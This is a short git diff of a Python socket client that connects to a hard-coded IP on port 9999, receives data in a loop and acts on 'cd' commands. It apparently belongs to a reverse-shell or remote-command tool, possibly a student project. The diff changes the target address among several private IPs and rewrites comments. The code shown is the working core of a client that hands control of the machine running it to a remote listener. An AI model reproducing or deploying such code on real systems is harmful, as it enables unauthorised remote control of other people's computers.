@@ -3,14 +3,16 @@ import os
 import subprocess
 
 s = socket.socket()
-host = '10.0.0.131'
+host = '192.168.1.78'
+# host = '134.154.79.136' #school wifi local address
+# host = '10.0.0.131'
 # host = '127.0.0.1'  # local host
 port = 9999
 
-s.connect((host, port))  # add comment ...
+s.connect((host, port))  # here the host address is connecting to the client address
 
 while True:
-    data = s.recv(1024)  # add comment ...
+    data = s.recv(1024)  #
     if data[:2].decode('utf-8') == 'cd':
         os.chdir(data[3:].decode('utf-8'))
 
